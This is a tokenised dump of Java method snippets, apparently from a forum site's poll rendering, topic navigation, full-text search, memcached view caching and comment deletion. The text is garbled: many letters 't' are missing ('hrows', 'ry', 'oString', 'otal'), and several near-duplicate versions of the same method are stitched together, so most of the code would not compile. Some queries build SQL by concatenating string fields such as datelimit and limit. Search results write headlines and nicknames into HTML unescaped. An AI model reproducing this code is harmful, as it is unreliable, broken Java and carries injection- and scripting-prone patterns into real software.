public int getPreviousMessage ( Connection db , int scrollMode ) hrows SQLException { PreparedStatement pst ; switch ( scrollMode ) { case Section . SCROLL_SECTION : pst = db . prepareStatement ( " SELECT topics.id as msgid FROM topics, groups WHERE topics.groupid=groups.id AND topics.commitdate=(SELECT max(commitdate) FROM topics, groups, sections WHERE sections.id=groups.section AND topics.commitdate<? AND topics.groupid=groups.id AND groups.section=? AND (topics.moderate OR NOT sections.moderate) AND NOT deleted) " ) ; pst . setTimestamp ( 1 , commitDate ) ; pst . setInt ( 2 , section ) ; break ; case Section . SCROLL_GROUP : pst = db . prepareStatement ( " SELECT topics.id as msgid FROM topics WHERE topics.id=(SELECT max(topics.id) FROM topics, groups, sections WHERE sections.id=groups.section AND topics.id<? AND topics.groupid=? AND topics.groupid=groups.id AND (topics.moderate OR NOT sections.moderate) AND NOT deleted) " ) ; pst . setInt ( 1 , msgid ) ; pst . setInt ( 2 , guid ) ; break ; case Section . SCROLL_NOSCROLL : default : return 0 ; } ry { ResultSet rs = pst . executeQuery ( ) ; 
public String printMessage ( Template mpl , Connection db , boolean showMenu , String user ) hrows SQLException , IOException , UserNotFoundException , UtilException { return printMessage ( mpl , db , showMenu , user , 0 ) ; } 
public String renderPoll ( Connection db , Template mpl ) hrows SQLException , BadImageException , IOException { return renderPoll ( db , mpl , 0 ) ; } 
public String renderPoll ( Connection db , Template mpl , int highlight ) hrows SQLException , BadImageException , IOException { StringBuffer out = new StringBuffer ( ) ; int max = getMaxVote ( db ) ; List vars = getPollVariants ( db , ORDER_VOTES ) ; out . append ( " <table> " ) ; ImageInfo info = new ImageInfo ( mpl . getObjectConfig ( ) . getHTMLPathPrefix ( ) + mpl . getStyle ( ) + " /img/votes.gif " ) ; for ( Iterator iter = vars . iterator ( ) ; iter . hasNext ( ) ; ) { PollVariant var = ( PollVariant ) iter . next ( ) ; out . append ( " <tr><td> " ) ; int id = var . getId ( ) ; int votes = var . getVotes ( ) ; if ( id = = highlight ) { out . append ( " <b> " ) ; } out . append ( HTMLFormatter . htmlSpecialChars ( var . getLabel ( ) ) ) ; if ( id = = highlight ) { out . append ( " </b> " ) ; } out . append ( " </td><td> " ) . append ( votes ) . append ( " </td><td> " ) ; for ( int i = 0 ; i < 20 * votes / max ; i + + ) { out . append ( " <img src= \" " ) . append ( mpl . getStyle ( ) ) . append ( " /img/votes.gif \" alt= \" * \" " ) . append ( info . getCode ( ) ) . append ( '>' ) ; } out . append ( " </td></tr> " ) ; } out . append ( " </table> " ) ; return out . oString ( ) ; } 
public String renderPoll ( Connection db , Template mpl , int highlight ) hrows SQLException , BadImageException , IOException { StringBuffer out = new StringBuffer ( ) ; int max = getMaxVote ( db ) ; int otal = 0 ; List vars = getPollVariants ( db , ORDER_VOTES ) ; out . append ( " <table> " ) ; ImageInfo info = new ImageInfo ( mpl . getObjectConfig ( ) . getHTMLPathPrefix ( ) + mpl . getStyle ( ) + " /img/votes.gif " ) ; for ( Iterator iter = vars . iterator ( ) ; iter . hasNext ( ) ; ) { PollVariant var = ( PollVariant ) iter . next ( ) ; out . append ( " <tr><td> " ) ; int id = var . getId ( ) ; int votes = var . getVotes ( ) ; if ( id = = highlight ) { out . append ( " <b> " ) ; } out . append ( HTMLFormatter . htmlSpecialChars ( var . getLabel ( ) ) ) ; if ( id = = highlight ) { out . append ( " </b> " ) ; } out . append ( " </td><td> " ) . append ( votes ) . append ( " </td><td> " ) ; otal + = votes ; for ( int i = 0 ; i < 20 * votes / max ; i + + ) { out . append ( " <img src= \" " ) . append ( mpl . getStyle ( ) ) . append ( " /img/votes.gif \" alt= \" * \" " ) . append ( info . getCode ( ) ) . append ( '>' ) ; } out . append ( " </td></tr> " ) ; } out . append ( " <tr><td colspan=2> : " ) . append ( otal ) . append ( " </td></tr> " ) ; out . append ( " </table> " ) ; return out . oString ( ) ; } 
public String renderPoll ( Connection db , Template mpl , int highlight ) hrows SQLException , BadImageException , IOException { StringBuffer out = new StringBuffer ( ) ; int max = getMaxVote ( db ) ; int otal = 0 ; List vars = getPollVariants ( db , ORDER_VOTES ) ; out . append ( " <table> " ) ; ImageInfo info = new ImageInfo ( mpl . getObjectConfig ( ) . getHTMLPathPrefix ( ) + mpl . getStyle ( ) + " /img/votes.gif " ) ; for ( Iterator iter = vars . iterator ( ) ; iter . hasNext ( ) ; ) { PollVariant var = ( PollVariant ) iter . next ( ) ; out . append ( " <tr><td> " ) ; int id = var . getId ( ) ; int votes = var . getVotes ( ) ; if ( id = = highlight ) { out . append ( " <b> " ) ; } out . append ( HTMLFormatter . htmlSpecialChars ( var . getLabel ( ) ) ) ; if ( id = = highlight ) { out . append ( " </b> " ) ; } out . append ( " </td><td> " ) . append ( votes ) . append ( " </td><td> " ) ; otal + = votes ; for ( int i = 0 ; i < 20 * votes / max ; i + + ) { out . append ( " <img src= \" / " ) . append ( mpl . getStyle ( ) ) . append ( " /img/votes.gif \" alt= \" * \" " ) . append ( info . getCode ( ) ) . append ( '>' ) ; } out . append ( " </td></tr> " ) ; } out . append ( " <tr><td colspan=2> : " ) . append ( otal ) . append ( " </td></tr> " ) ; out . append ( " </table> " ) ; return out . oString ( ) ; } 
public static int getPollIdByTopic ( Connection db , int msgid ) hrows SQLException { PreparedStatement pst = db . prepareStatement ( " SELECT votenames.id FROM votenames,topics WHERE topics.id=? AND votenames.topic=topics.id " ) ; pst . clearParameters ( ) ; pst . setInt ( 1 , msgid ) ; ResultSet rs = pst . executeQuery ( ) ; return rs . next ( ) ? rs . getInt ( " id " ) : 0 ; } 
public String renderPoll ( Connection db , Template mpl , int highlight ) hrows SQLException , BadImageException , IOException { StringBuffer out = new StringBuffer ( ) ; int max = getMaxVote ( db ) ; List vars = getPollVariants ( db , ORDER_VOTES ) ; out . append ( " <table> " ) ; ImageInfo info = new ImageInfo ( mpl . getObjectConfig ( ) . getHTMLPathPrefix ( ) + mpl . getStyle ( ) + " /img/votes.gif " ) ; int otal = 0 ; for ( Iterator iter = vars . iterator ( ) ; iter . hasNext ( ) ; ) { PollVariant var = ( PollVariant ) iter . next ( ) ; out . append ( " <tr><td> " ) ; int id = var . getId ( ) ; int votes = var . getVotes ( ) ; if ( id = = highlight ) { out . append ( " <b> " ) ; } out . append ( HTMLFormatter . htmlSpecialChars ( var . getLabel ( ) ) ) ; if ( id = = highlight ) { out . append ( " </b> " ) ; } out . append ( " </td><td> " ) . append ( votes ) . append ( " </td><td> " ) ; otal + = votes ; for ( int i = 0 ; i < 20 * votes / max ; i + + ) { out . append ( " <img src= \" / " ) . append ( mpl . getStyle ( ) ) . append ( " /img/votes.gif \" alt= \" * \" " ) . append ( info . getCode ( ) ) . append ( '>' ) ; } out . append ( " </td></tr> " ) ; } out . append ( " <tr><td colspan=2> : " ) . append ( otal ) . append ( " </td></tr> " ) ; out . append ( " </table> " ) ; return out . oString ( ) ; } 
public String renderPoll ( Connection db ) hrows SQLException { StringBuffer out = new StringBuffer ( ) ; int max = getMaxVote ( db ) ; List vars = getPollVariants ( db , ORDER_VOTES ) ; out . append ( " <table> " ) ; int otal = 0 ; for ( Iterator iter = vars . iterator ( ) ; iter . hasNext ( ) ; ) { PollVariant var = ( PollVariant ) iter . next ( ) ; out . append ( " <tr><td> " ) ; int votes = var . getVotes ( ) ; out . append ( HTMLFormatter . htmlSpecialChars ( var . getLabel ( ) ) ) ; out . append ( " </td><td> " ) . append ( votes ) . append ( " </td><td> " ) ; total + = votes ; for ( int i = 0 ; i < 20 * votes / max ; i + + ) { out . append ( " <img src= \" / " ) . append ( " /white/img/votes.gif \" alt= \" * \" > " ) ; } out . append ( " </td></tr> " ) ; } out . append ( " <tr><td colspan=2> : " ) . append ( otal ) . append ( " </td></tr> " ) ; out . append ( " </table> " ) ; return out . oString ( ) ; } 
public String renderPoll ( Connection db , String fullUrl ) hrows SQLException { StringBuffer out = new StringBuffer ( ) ; int max = getMaxVote ( db ) ; List vars = getPollVariants ( db , ORDER_VOTES ) ; out . append ( " <table> " ) ; int otal = 0 ; for ( Iterator iter = vars . iterator ( ) ; iter . hasNext ( ) ; ) { PollVariant var = ( PollVariant ) iter . next ( ) ; out . append ( " <tr><td> " ) ; int votes = var . getVotes ( ) ; out . append ( HTMLFormatter . htmlSpecialChars ( var . getLabel ( ) ) ) ; out . append ( " </td><td> " ) . append ( votes ) . append ( " </td><td> " ) ; total + = votes ; for ( int i = 0 ; i < 20 * votes / max ; i + + ) { out . append ( " <img src= \" / " ) . append ( fullUrl + " white/img/votes.gif \" alt= \" * \" > " ) ; } out . append ( " </td></tr> " ) ; } out . append ( " <tr><td colspan=2> : " ) . append ( otal ) . append ( " </td></tr> " ) ; out . append ( " </table> " ) ; return out . oString ( ) ; } 
public String renderPoll ( Connection db , String fullUrl ) hrows SQLException { StringBuffer out = new StringBuffer ( ) ; int max = getMaxVote ( db ) ; List vars = getPollVariants ( db , ORDER_VOTES ) ; out . append ( " <table> " ) ; int otal = 0 ; for ( Iterator iter = vars . iterator ( ) ; iter . hasNext ( ) ; ) { PollVariant var = ( PollVariant ) iter . next ( ) ; out . append ( " <tr><td> " ) ; int votes = var . getVotes ( ) ; out . append ( HTMLFormatter . htmlSpecialChars ( var . getLabel ( ) ) ) ; out . append ( " </td><td> " ) . append ( votes ) . append ( " </td><td> " ) ; total + = votes ; for ( int i = 0 ; i < 20 * votes / max ; i + + ) { out . append ( " <img src= \" " ) . append ( fullUrl + " white/img/votes.gif \" alt= \" * \" > " ) ; } out . append ( " </td></tr> " ) ; } out . append ( " <tr><td colspan=2> : " ) . append ( otal ) . append ( " </td></tr> " ) ; out . append ( " </table> " ) ; return out . oString ( ) ; } 
private static synchronized void initProperties ( ServletContext sc ) hrows IOException { if ( properties = = null ) { InputStream is = null ; 
public String showAll ( Connection db , Template mpl ) hrows IOException , SQLException , UtilException { StringBuffer buf = new StringBuffer ( ) ; Statement st = db . createStatement ( ) ; StringBuilder where = new StringBuilder ( " sections.id=groups.section AND topics.id=msgbase.id AND topics.userid=users.id " + " AND topics.groupid=groups.id AND NOT deleted " ) ; if ( ! viewAll ) { where . append ( " AND (topics.moderate OR NOT sections.moderate) " ) ; } else { where . append ( " AND (NOT topics.moderate) AND sections.moderate " ) ; } if ( section ! = 0 ) { where . append ( " AND section= " ) . append ( section ) ; } if ( group ! = 0 ) { where . append ( " AND groupid= " ) . append ( group ) ; } if ( datelimit ! = null ) { where . append ( " AND " ) . append ( datelimit ) ; } ResultSet res = st . executeQuery ( " SELECT topics.title as subj, topics.lastmod, topics.stat1, postdate, nick, image, " + " groups.title as gtitle, topics.id as msgid, sections.comment, groups.id as guid, " + " opics.url, topics.linktext, imagepost, vote, sections.name as pname, linkup, " + " postdate<(CURRENT_TIMESTAMP-expire) as expired, message, sections.id as section " + " FROM topics,groups,users,sections,msgbase " + " WHERE " + where . oString ( ) + " " + " ORDER BY commitdate DESC, msgid DESC " + limit ) ; while ( res . next ( ) ) { buf . append ( showCurrent ( db , mpl , res ) ) ; } res . close ( ) ; return buf . oString ( ) ; } 
public String show ( Connection db ) hrows IOException , SQLException , UtilException { StringBuffer buf = new StringBuffer ( ) ; Statement st = db . createStatement ( ) ; StringBuilder where = new StringBuilder ( " sections.id=groups.section AND topics.id=msgbase.id AND topics.userid=users.id " + " AND topics.groupid=groups.id AND NOT deleted " ) ; if ( ! viewAll ) { where . append ( " AND (topics.moderate OR NOT sections.moderate) " ) ; } else { where . append ( " AND (NOT topics.moderate) AND sections.moderate " ) ; } if ( section ! = 0 ) { where . append ( " AND section= " ) . append ( section ) ; } if ( group ! = 0 ) { where . append ( " AND groupid= " ) . append ( group ) ; } if ( datelimit ! = null ) { where . append ( " AND " ) . append ( datelimit ) ; } ResultSet res = st . executeQuery ( " SELECT topics.title as subj, topics.lastmod, topics.stat1, postdate, nick, image, " + " groups.title as gtitle, topics.id as msgid, sections.comment, groups.id as guid, " + " opics.url, topics.linktext, imagepost, vote, sections.name as pname, linkup, " + " postdate<(CURRENT_TIMESTAMP-expire) as expired, message, sections.id as section " + " FROM topics,groups,users,sections,msgbase " + " WHERE " + where . oString ( ) + " " + " ORDER BY commitdate DESC, msgid DESC " + limit ) ; while ( res . next ( ) ) { buf . append ( showCurrent ( db , res ) ) ; } res . close ( ) ; return buf . oString ( ) ; } 
public String getVariantID ( ProfileHashtable prof ) hrows UtilException { StringBuilder id = new StringBuilder ( " view-news? " + " SearchMode= " + prof . getBoolean ( " SearchMode " ) + " &topics= " + prof . getInt ( " opics " ) + " &messages= " + prof . getInt ( " messages " ) + " &style= " + prof . getString ( " style " ) ) ; if ( viewAll ) { id . append ( " &view-all=true " ) ; } if ( section ! = 0 ) { id . append ( " &section= " ) . append ( section ) ; } if ( group ! = 0 ) { id . append ( " &group= " ) . append ( group ) ; } if ( datelimit ! = null ) { id . append ( " &datelimit= " ) . append ( URLEncoder . encode ( datelimit ) ) ; } if ( limit ! = null & & limit . length ( ) > 0 ) { id . append ( " &limit= " ) . append ( URLEncoder . encode ( limit ) ) ; } return id . oString ( ) ; } 
public String renderPoll ( Connection db , Properties config , ProfileHashtable profile ) hrows SQLException , BadImageException , IOException { return renderPoll ( db , config , profile , 0 ) ; } 
public String renderPoll ( Connection db , Properties config , ProfileHashtable profile , int highlight ) hrows SQLException , BadImageException , IOException { StringBuffer out = new StringBuffer ( ) ; int max = getMaxVote ( db ) ; List vars = getPollVariants ( db , ORDER_VOTES ) ; out . append ( " <table> " ) ; ImageInfo info = new ImageInfo ( config . getProperty ( " HTMLPathPrefix " ) + profile . getString ( " style " ) + " /img/votes.gif " ) ; int otal = 0 ; for ( Iterator iter = vars . iterator ( ) ; iter . hasNext ( ) ; ) { PollVariant var = ( PollVariant ) iter . next ( ) ; out . append ( " <tr><td> " ) ; int id = var . getId ( ) ; int votes = var . getVotes ( ) ; if ( id = = highlight ) { out . append ( " <b> " ) ; } out . append ( HTMLFormatter . htmlSpecialChars ( var . getLabel ( ) ) ) ; if ( id = = highlight ) { out . append ( " </b> " ) ; } out . append ( " </td><td> " ) . append ( votes ) . append ( " </td><td> " ) ; otal + = votes ; for ( int i = 0 ; i < 20 * votes / max ; i + + ) { out . append ( " <img src= \" / " ) . append ( profile . getString ( " style " ) ) . append ( " /img/votes.gif \" alt= \" * \" " ) . append ( info . getCode ( ) ) . append ( '>' ) ; } out . append ( " </td></tr> " ) ; } out . append ( " <tr><td colspan=2> : " ) . append ( otal ) . append ( " </td></tr> " ) ; out . append ( " </table> " ) ; return out . oString ( ) ; } 
public String renderPoll ( Connection db , String fullUrl ) hrows SQLException { StringBuffer out = new StringBuffer ( ) ; int max = getMaxVote ( db ) ; List vars = getPollVariants ( db , ORDER_VOTES ) ; out . append ( " <table> " ) ; int otal = 0 ; for ( Iterator iter = vars . iterator ( ) ; iter . hasNext ( ) ; ) { PollVariant var = ( PollVariant ) iter . next ( ) ; out . append ( " <tr><td> " ) ; int votes = var . getVotes ( ) ; out . append ( HTMLFormatter . htmlSpecialChars ( var . getLabel ( ) ) ) ; out . append ( " </td><td> " ) . append ( votes ) . append ( " </td><td> " ) ; total + = votes ; for ( int i = 0 ; i < 20 * votes / max ; i + + ) { out . append ( " <img src= \" " ) . append ( fullUrl ) . append ( " white/img/votes.gif \" alt= \" * \" > " ) ; } out . append ( " </td></tr> " ) ; } out . append ( " <tr><td colspan=2> : " ) . append ( otal ) . append ( " </td></tr> " ) ; out . append ( " </table> " ) ; return out . oString ( ) ; } 
String show ( Connection db ) hrows IOException , SQLException , UtilException ; String getVariantID ( ProfileHashtable prof ) hrows UtilException ; java . util . Date getExpire ( ) ; } 
String getVariantID ( ProfileHashtable prof ) hrows UtilException ; java . util . Date getExpire ( ) ; } 
public static String getViewer ( Viewer viewer , Template mpl , boolean nocache , boolean closeConnection ) hrows UtilException , SQLException , IOException { MemCachedClient mcc = MemCachedSettings . getClient ( ) ; String cacheId = MemCachedSettings . getId ( mpl , viewer . getVariantID ( mpl . getProf ( ) ) ) ; String res = null ; if ( ! nocache ) { res = ( String ) mcc . get ( cacheId ) ; } if ( res = = null ) { ry { Connection db = mpl . getConnection ( " viewer-cacher " ) ; res = viewer . show ( db ) ; } finally { if ( closeConnection ) { mpl . getObjectConfig ( ) . SQLclose ( ) ; } } mcc . add ( cacheId , res , viewer . getExpire ( ) ) ; } return res ; } 
public String show ( Connection db ) hrows IOException , SQLException , UtilException { StringBuilder select = new StringBuilder ( " SELECT msgs.id, title, postdate, section, topic, rank(idxFTI, q) as rank, headline(message, q, 'HighlightAll=True') as headline " ) ; if ( include = = SEARCH_ALL ) { select . append ( " FROM msgs_and_cmts as msgs, msgbase, plainto_tsquery(?) as q " ) ; } else { select . append ( " FROM msgs, msgbase, plainto_tsquery(?) as q " ) ; } select . append ( " WHERE msgs.id = msgbase.id AND idxFTI @@ q " ) ; if ( date = = SEARCH_3MONTH ) { select . append ( " AND postdate>CURRENT_TIMESTAMP-'3 month'::interval " ) ; } else if ( date = = SEARCH_YEAR ) { select . append ( " AND postdate>CURRENT_TIMESTAMP-'1 year'::interval " ) ; } if ( section ! = 0 ) { select . append ( " AND section= " + section ) ; } if ( sort = = SORT_DATE ) { select . append ( " ORDER BY postdate DESC " ) ; } else { select . append ( " ORDER BY rank DESC " ) ; } select . append ( " LIMIT 100 " ) ; PreparedStatement pst = db . prepareStatement ( select . oString ( ) ) ; pst . setString ( 1 , query ) ; ResultSet rs = pst . executeQuery ( ) ; return printResults ( rs ) ; } 
private String printResults ( ResultSet rs ) hrows SQLException { StringBuilder out = new StringBuilder ( " <h1> </h1> " ) ; out . append ( " <div class= \" messages \" ><div class= \" comment \" " ) ; while ( rs . next ( ) ) { String itle = rs . getString ( " itle " ) ; int opic = rs . getInt ( " opic " ) ; int id = rs . getInt ( " id " ) ; String headline = rs . getString ( " headline " ) ; Timestamp postdate = rs . getTimestamp ( " postdate " ) ; String url ; if ( opic = = 0 ) { url = " jump-message.jsp?msgid= " + id ; } else { url = " jump-message.jsp?msgid= " + opic + " # " + id ; } out . append ( " <table width= \" 100% \" cellspacing=0 cellpadding=0 border=0> " ) ; out . append ( " <tr class=body><td> " ) ; out . append ( " <div class=msg> " ) ; out . append ( " <h2><a href= \" " + url + " \" > " + HTMLFormatter . htmlSpecialChars ( itle ) + " </a></h2> " ) ; out . append ( " <p> " + headline + " </p> " ) ; out . append ( " <i> " + Template . dateFormat . format ( postdate ) + " </i> " ) ; out . append ( " </div></td></tr></table><p> " ) ; } out . append ( " </div></div> " ) ; return out . oString ( ) ; } 
public String getVariantID ( ProfileHashtable prof ) hrows UtilException { return " search?q= " + URLEncoder . encode ( query ) + " &include= " + include + " &date= " + date + " &section= " + section + " &sort= " + sort ; } 
public static int parseInclude ( String include ) { if ( include = = null ) { return SEARCH_ALL ; } if ( include . equals ( " opics " ) ) { return SEARCH_TOPICS ; } return SEARCH_ALL ; } 
public static int parseDate ( String date ) { if ( date = = null ) { return SEARCH_YEAR ; } if ( date . equals ( " 3month " ) ) { return SEARCH_3MONTH ; } if ( date . equals ( " all " ) ) { return SEARCH_ALL ; } return SEARCH_YEAR ; } 
public static String getViewer ( Viewer viewer , Template mpl , boolean nocache , boolean closeConnection ) hrows UtilException , SQLException , IOException { return new ViewerCacher ( ) . get ( viewer , mpl , nocache , closeConnection ) ; } 
public String get ( Viewer viewer , Template mpl , boolean nocache , boolean closeConnection ) hrows UtilException , SQLException , IOException { MemCachedClient mcc = MemCachedSettings . getClient ( ) ; String cacheId = MemCachedSettings . getId ( mpl , viewer . getVariantID ( mpl . getProf ( ) ) ) ; String res = null ; if ( ! nocache ) { ime = 0 ; long current = new Date ( ) . getTime ( ) ; res = ( String ) mcc . get ( cacheId ) ; ime = new Date ( ) . getTime ( ) - current ; fromCache = rue ; } if ( res = = null ) { ry { long current = new Date ( ) . getTime ( ) ; Connection db = mpl . getConnection ( " viewer-cacher " ) ; res = viewer . show ( db ) ; ime = new Date ( ) . getTime ( ) - current ; fromCache = false ; } finally { if ( closeConnection ) { mpl . getObjectConfig ( ) . SQLclose ( ) ; } } mcc . add ( cacheId , res , viewer . getExpire ( ) ) ; } return res ; } 
public boolean isFromCache ( ) { return fromCache ; } 
public String show ( Connection db ) hrows IOException , SQLException , UtilException { StringBuilder select = new StringBuilder ( " SELECT msgs.id, title, postdate, section, topic, nick, score, max_score, rank(idxFTI, q) as rank, headline(message, q, 'HighlightAll=True') as headline " ) ; if ( include = = SEARCH_ALL ) { select . append ( " FROM msgs_and_cmts as msgs, msgbase, plainto_tsquery(?) as q " ) ; } else { select . append ( " FROM msgs, msgbase, plainto_tsquery(?) as q " ) ; } select . append ( " WHERE msgs.id = msgbase.id AND idxFTI @@ q " ) ; if ( date = = SEARCH_3MONTH ) { select . append ( " AND postdate>CURRENT_TIMESTAMP-'3 month'::interval " ) ; } else if ( date = = SEARCH_YEAR ) { select . append ( " AND postdate>CURRENT_TIMESTAMP-'1 year'::interval " ) ; } if ( section ! = 0 ) { select . append ( " AND section= " + section ) ; } if ( sort = = SORT_DATE ) { select . append ( " ORDER BY postdate DESC " ) ; } else { select . append ( " ORDER BY rank DESC " ) ; } select . append ( " LIMIT 100 " ) ; PreparedStatement pst = db . prepareStatement ( select . oString ( ) ) ; pst . setString ( 1 , query ) ; ResultSet rs = pst . executeQuery ( ) ; return printResults ( rs ) ; } 
private String printResults ( ResultSet rs ) hrows SQLException { StringBuilder out = new StringBuilder ( " <h1> </h1> " ) ; out . append ( " <div class= \" messages \" ><div class= \" comment \" " ) ; while ( rs . next ( ) ) { String itle = rs . getString ( " itle " ) ; int opic = rs . getInt ( " opic " ) ; int id = rs . getInt ( " id " ) ; String headline = rs . getString ( " headline " ) ; Timestamp postdate = rs . getTimestamp ( " postdate " ) ; String nick = rs . getString ( " nick " ) ; int userScore = rs . getInt ( " score " ) ; int userMaxScore = rs . getInt ( " max_score " ) ; String url ; if ( opic = = 0 ) { url = " jump-message.jsp?msgid= " + id ; } else { url = " jump-message.jsp?msgid= " + opic + " # " + id ; } out . append ( " <table width= \" 100% \" cellspacing=0 cellpadding=0 border=0> " ) ; out . append ( " <tr class=body><td> " ) ; out . append ( " <div class=msg> " ) ; out . append ( " <h2><a href= \" " + url + " \" > " + HTMLFormatter . htmlSpecialChars ( itle ) + " </a></h2> " ) ; out . append ( " <p> " + headline + " </p> " ) ; out . append ( " <p><i> " ) . append ( nick ) . append ( ' ' ) ; if ( ! " anonymous " . equals ( nick ) ) { out . append ( User . getStars ( userScore , userMaxScore ) ) . append ( ' ' ) ; } out . append ( " (<a href= \" whois.jsp?nick= " ) . append ( URLEncoder . encode ( nick ) ) . append ( " \" >*</a>) ( " ) . append ( Template . dateFormat . format ( postdate ) ) . append ( " )</i> " ) ; out . append ( " </div></td></tr></table><p> " ) ; } out . append ( " </div></div> " ) ; return out . oString ( ) ; } 
public String getVariantID ( ProfileHashtable prof ) hrows UtilException { StringBuilder id = new StringBuilder ( " view-news? " + " opics= " + prof . getInt ( " opics " ) + " &messages= " + prof . getInt ( " messages " ) + " &style= " + prof . getString ( " style " ) ) ; if ( viewAll ) { id . append ( " &view-all=true " ) ; } if ( section ! = 0 ) { id . append ( " &section= " ) . append ( section ) ; } if ( group ! = 0 ) { id . append ( " &group= " ) . append ( group ) ; } if ( datelimit ! = null ) { id . append ( " &datelimit= " ) . append ( URLEncoder . encode ( datelimit ) ) ; } if ( limit ! = null & & limit . length ( ) > 0 ) { id . append ( " &limit= " ) . append ( URLEncoder . encode ( limit ) ) ; } return id . oString ( ) ; } 
public String DocumentFooter ( boolean closeHtml ) hrows IOException , StorageException { StringBuffer out = new StringBuffer ( ) ; out . append ( " <p><i><a href= \" " ) . append ( getRedirectUrl ( ) ) . append ( " \" > " ) . append ( getMainUrl ( ) ) . append ( " </a></i> " ) ; if ( ! isMainPage ( ) ) { out . append ( " <div align=center><iframe src= \" dw.jsp?width=728&amp;height=90&amp;main=0 \" width= \" 728 \" height= \" 90 \" scrolling= \" no \" frameborder= \" 0 \" ></iframe></div> " ) ; } out . append ( " <p><div align=center> " ) ; if ( isMainPage ( ) ) { out . append ( config . getStorage ( ) . readMessage ( " buttons " , " op100-main-button " ) ) ; out . append ( config . getStorage ( ) . readMessage ( " buttons " , " oplist-main-button " ) ) ; out.append(config.getStorage().readMessage("buttons", "spylog-button")); } out.append("</div>"); Google analytics out.append("<script src=\"http:www.google-analytics.com/urchin.js\" type=\"text/javascript\">" + "</script>" + "<script type=\"text/javascript\">" + "_uacct = \"UA-2184304-1\";" + "urchinTracker();" + "</script>"); if (closeHtml) { out.append("</body></html>"); } Date currentDate = new Date(); long millis = currentDate.getTime() - startDate.getTime(); if (millis>WARNING_EXEC_TIME) { logger.notice("template", "execTime="+millis/1000+" seconds (dbWait="+config.getDbWaitTime()/1000+" seconds): "+requestString); } return out.toString(); } 
public String getVariantID ( ProfileHashtable prof ) hrows UtilException { return " " ; } 
public String getVariantID ( ProfileHashtable prof ) hrows UtilException { return " messages= " + prof . getInt ( " messages " ) + " &style= " + prof . getString ( " style " ) ; } 
public static void main ( String [ ] args ) hrows Exception { Hashtable defaults = getDefaultProfile ( ) ; FileOutputStream f = new FileOutputStream ( " anonymous " ) ; ObjectOutputStream o = new ObjectOutputStream ( f ) ; o . writeObject ( defaults ) ; o . close ( ) ; f . close ( ) ; defaults = new Hashtable ( ) ; f = new FileOutputStream ( " _debug " ) ; defaults . put ( " DebugMode " , Boolean . TRUE ) ; o = new ObjectOutputStream ( f ) ; o . writeObject ( defaults ) ; o . close ( ) ; f . close ( ) ; defaults = new Hashtable ( ) ; f = new FileOutputStream ( " _white2 " ) ; defaults . put ( " style " , " white2 " ) ; o = new ObjectOutputStream ( f ) ; o . writeObject ( defaults ) ; o . close ( ) ; f . close ( ) ; defaults = new Hashtable ( ) ; f = new FileOutputStream ( " _white " ) ; defaults . put ( " style " , " white " ) ; o = new ObjectOutputStream ( f ) ; o . writeObject ( defaults ) ; o . close ( ) ; f . close ( ) ; } 
public Message getNextMessage ( Connection db ) hrows SQLException { PreparedStatement pst ; int scrollMode = Section . getScrollMode ( getSectionId ( ) ) ; switch ( scrollMode ) { case Section . SCROLL_SECTION : pst = db . prepareStatement ( " SELECT topics.id as msgid FROM topics, groups WHERE topics.groupid=groups.id AND topics.commitdate=(SELECT min(commitdate) FROM topics, groups, sections WHERE sections.id=groups.section AND topics.commitdate>? AND topics.groupid=groups.id AND groups.section=? AND (topics.moderate OR NOT sections.moderate) AND NOT deleted) " ) ; pst . setTimestamp ( 1 , commitDate ) ; pst . setInt ( 2 , section ) ; break ; case Section . SCROLL_GROUP : pst = db . prepareStatement ( " SELECT topics.id as msgid FROM topics WHERE topics.id=(SELECT min(topics.id) FROM topics, groups, sections WHERE sections.id=groups.section AND topics.id>? AND topics.groupid=? AND topics.groupid=groups.id AND (topics.moderate OR NOT sections.moderate) AND NOT deleted) " ) ; pst . setInt ( 1 , msgid ) ; pst . setInt ( 2 , guid ) ; break ; case Section . SCROLL_NOSCROLL : default : return null ; } ry { ResultSet rs = pst . executeQuery ( ) ; 
public Message getPreviousMessage ( Connection db ) hrows SQLException { PreparedStatement pst ; int scrollMode = Section . getScrollMode ( getSectionId ( ) ) ; switch ( scrollMode ) { case Section . SCROLL_SECTION : pst = db . prepareStatement ( " SELECT topics.id as msgid FROM topics, groups WHERE topics.groupid=groups.id AND topics.commitdate=(SELECT max(commitdate) FROM topics, groups, sections WHERE sections.id=groups.section AND topics.commitdate<? AND topics.groupid=groups.id AND groups.section=? AND (topics.moderate OR NOT sections.moderate) AND NOT deleted) " ) ; pst . setTimestamp ( 1 , commitDate ) ; pst . setInt ( 2 , section ) ; break ; case Section . SCROLL_GROUP : pst = db . prepareStatement ( " SELECT topics.id as msgid FROM topics WHERE topics.id=(SELECT max(topics.id) FROM topics, groups, sections WHERE sections.id=groups.section AND topics.id<? AND topics.groupid=? AND topics.groupid=groups.id AND (topics.moderate OR NOT sections.moderate) AND NOT deleted) " ) ; pst . setInt ( 1 , msgid ) ; pst . setInt ( 2 , guid ) ; break ; case Section . SCROLL_NOSCROLL : default : return null ; } ry { ResultSet rs = pst . executeQuery ( ) ; 
public void block ( Connection db ) hrows SQLException { Statement st = null ; ry { st = db . createStatement ( ) ; 
public String deleteAllComments ( Connection db , Logger logger , User moderator ) hrows SQLException { Statement st = null ; ResultSet rs = null ; CommentDeleter deleter = null ; StringBuilder out = new StringBuilder ( ) ; ry { deleter = new CommentDeleter ( db , logger ) ; st = db . createStatement ( ) ; rs = st . executeQuery ( " SELECT id FROM comments WHERE userid= " + id + " AND not deleted ORDER BY id DESC FOR update " ) ; while ( rs . next ( ) ) { int msgid = rs . getInt ( " id " ) ; out . append ( " # " ) . append ( msgid ) . append ( " <br> " ) ; out . append ( deleter . deleteReplys ( msgid , moderator , rue ) ) ; out . append ( deleter . deleteComment ( msgid , " 4.7 Flood (auto) " , moderator , 20 ) ) ; out . append ( " <br> " ) ; } } finally { if ( deleter ! = null ) { deleter . close ( ) ; } if ( rs ! = null ) { rs . close ( ) ; } if ( st ! = null ) { st . close ( ) ; } } return out . oString ( ) ; } 
